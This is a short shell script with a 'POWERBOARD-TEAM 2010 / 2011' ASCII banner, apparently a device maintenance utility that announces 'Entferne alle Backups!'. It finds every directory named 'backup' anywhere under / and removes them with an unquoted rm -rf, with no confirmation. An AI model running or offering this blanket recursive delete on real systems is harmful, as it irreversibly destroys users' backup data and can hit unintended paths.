#!/bin/sh
echo "*******************************************"
echo "*      .--.                               *"
echo "*     |o_o |                              *"
echo "*     |\_/ | POWERBOARD-TEAM 2010 / 2011  *"
echo "*    //    \\                              *"
echo "*   (|     | )                            *"
echo "*  / \_   _/ \                            *"
echo "*  \___)-(___/                            *"
echo "*******************************************"
	sleep 1
echo "Entferne alle Backups!"
	sleep 1
echo "."
	sleep 1
echo ".."
backupdel=`find / -name backup -type d`
	wait
echo $backupdel
rm -rf $backupdel
wait
echo "..."
echo "done!"
echo " "
exit 0
